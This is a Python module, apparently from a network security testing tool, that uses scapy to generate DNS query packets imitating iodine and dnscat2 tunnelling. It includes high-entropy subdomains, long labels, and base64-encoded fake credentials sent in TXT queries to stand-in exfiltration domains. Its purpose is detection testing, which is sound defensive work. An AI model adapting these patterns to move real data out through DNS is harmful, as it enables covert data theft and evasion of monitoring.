"""DNS Tunneling detection test module."""

import base64
import random
import string
from collections.abc import Iterator

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.packet import Packet

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


class DNSTunnelingModule(TrafficModule):
    """Traffic module for DNS tunneling patterns.

    Generates DNS queries that mimic DNS tunneling tools like
    iodine, dnscat2, and other data exfiltration methods.
    """

    def __init__(self) -> None:
        """Initialize the DNS tunneling module."""
        self._query_count = 0
        # Simulated tunnel domains
        self._tunnel_domains = [
            "tunnel.example.com",
            "dns.exfil.net",
            "covert.channel.org",
            "data.transfer.io",
        ]

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="dns_tunneling",
            description="DNS tunneling patterns (iodine, dnscat2 style)",
            category=TrafficCategory.DNS_FILTER,
            protocols=["UDP", "DNS"],
            ports=[53],
        )

    def _generate_high_entropy_subdomain(self, length: int = 32) -> str:
        """Generate a high-entropy subdomain like DNS tunneling tools."""
        # Mix of base64-like characters
        chars = string.ascii_lowercase + string.digits
        return "".join(random.choices(chars, k=length))

    def _generate_iodine_style_query(self) -> str:
        """Generate a query mimicking iodine DNS tunnel."""
        # Iodine uses base32/base64 encoded data in subdomains
        # Format: [encoded_data].[session_id].[domain]
        encoded_data = self._generate_high_entropy_subdomain(48)
        session_id = f"t{random.randint(0, 255):02x}"
        domain = random.choice(self._tunnel_domains)
        return f"{encoded_data}.{session_id}.{domain}"

    def _generate_dnscat2_style_query(self) -> str:
        """Generate a query mimicking dnscat2 tunnel."""
        # dnscat2 uses hex-encoded data
        # Format: [hex_data].[domain]
        hex_data = "".join(random.choices("0123456789abcdef", k=64))
        domain = random.choice(self._tunnel_domains)
        return f"{hex_data}.{domain}"

    def _generate_txt_exfil_query(self) -> str:
        """Generate a TXT record exfiltration query."""
        # Encode fake sensitive data
        fake_data = f"user=admin&pass={''.join(random.choices(string.ascii_letters, k=8))}"
        encoded = base64.b64encode(fake_data.encode()).decode().replace("=", "")
        domain = random.choice(self._tunnel_domains)
        return f"{encoded}.txt.{domain}"

    def _generate_long_subdomain_query(self) -> str:
        """Generate query with suspiciously long subdomain."""
        # DNS tunneling often uses maximum length subdomains
        # Each label can be up to 63 characters
        label1 = self._generate_high_entropy_subdomain(60)
        label2 = self._generate_high_entropy_subdomain(60)
        label3 = self._generate_high_entropy_subdomain(30)
        domain = random.choice(self._tunnel_domains)
        return f"{label1}.{label2}.{label3}.{domain}"

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate DNS tunneling packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port (default 53)

        Yields:
            Scapy DNS packets with tunneling patterns
        """
        port = dst_port or 53
        self._query_count += 1

        # Rotate through different tunneling patterns
        pattern = self._query_count % 5

        if pattern == 0:
            qname = self._generate_iodine_style_query()
            qtype = 1  # A record
        elif pattern == 1:
            qname = self._generate_dnscat2_style_query()
            qtype = 1  # A record
        elif pattern == 2:
            qname = self._generate_txt_exfil_query()
            qtype = 16  # TXT record
        elif pattern == 3:
            qname = self._generate_long_subdomain_query()
            qtype = 28  # AAAA record
        else:
            # CNAME tunneling
            qname = self._generate_high_entropy_subdomain(40) + "." + random.choice(
                self._tunnel_domains
            )
            qtype = 5  # CNAME record

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=port)
            / DNS(
                id=random.randint(0, 65535),
                rd=1,
                qd=DNSQR(qname=qname, qtype=qtype),
            )
        )

        yield packet

        # Generate a burst of queries (tunneling tools send many queries)
        for _ in range(3):
            qname = self._generate_high_entropy_subdomain(32) + "." + random.choice(
                self._tunnel_domains
            )
            packet = (
                IP(src=src_ip, dst=dst_ip)
                / UDP(sport=random.randint(49152, 65535), dport=port)
                / DNS(
                    id=random.randint(0, 65535),
                    rd=1,
                    qd=DNSQR(qname=qname, qtype=1),
                )
            )
            yield packet

